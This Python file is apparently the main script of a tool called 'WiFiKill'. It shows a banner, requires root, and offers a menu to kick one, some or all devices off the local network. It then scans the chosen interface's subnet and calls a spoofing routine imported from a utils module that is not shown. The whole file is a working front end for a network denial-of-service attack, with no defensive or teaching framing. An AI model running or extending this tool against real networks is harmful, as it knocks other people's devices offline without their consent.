# -*- coding: utf-8 -*-

import sys
from time import sleep
from utils import scanning, spoofing, fancyDisplay
import subprocess
import socket
import psutil
from os import getenv

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END ,WARNING = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[93m'

def main():

    sys.stdout.write(RED + """


██╗    ██╗██╗███████╗██╗██╗  ██╗██╗██╗     ██╗       
██║    ██║██║██╔════╝██║██║ ██╔╝██║██║     ██║     
██║ █╗ ██║██║█████╗  ██║█████╔╝ ██║██║     ██║     
██║███╗██║██║██╔══╝  ██║██╔═██╗ ██║██║     ██║     
╚███╔███╔╝██║██║     ██║██║  ██╗██║███████╗███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝


""")

    if getenv("SUDO_USER") is None:
        print ('This script need root privilege')
        exit(0)
    attackMode = menu()
    try:
        interfaces = psutil.net_if_addrs()
        for i in interfaces.keys():
            fancyDisplay(i + " : " + interfaces[i][0][1] + '\n', WHITE)
        iface = ""
        while iface not in interfaces.keys():
            fancyDisplay("[*] Enter desired interface : ", WHITE)
            iface = input("")

        fancyDisplay("[*] Enter down time for ip(s) : ",WHITE)
        downTime = input("")

    except KeyboardInterrupt:
        fancyDisplay("\n[*] User request shutdown", WHITE )
        fancyDisplay("\n[*] Quitting ... \n", WHITE)
        sys.exit(1)
    
    netmask= interfaces[iface][0][2]
    rangeOfIp = str(interfaces[iface][0][1]) + "/" + str(sum([bin(int(x)).count('1') for x in netmask.split('.')]))
    scanning(iface, rangeOfIp)
    spoofing(attackMode, downTime)

def menu():
    fancyDisplay("1) Kick one device\n", GREEN)
    sleep(0.05)
    fancyDisplay("2) Kick some devices\n", WARNING)
    sleep(0.05)
    fancyDisplay("3) Kick all devices\n", RED)

    while True:
        try:
            fancyDisplay("What do you want to do ? ", WHITE)
            choice = input("")
            choice = int(choice)
            return choice

        except Exception as Err:
            fancyDisplay("[!] pls Enter a number\n", WHITE)

if __name__ == '__main__':
    main()
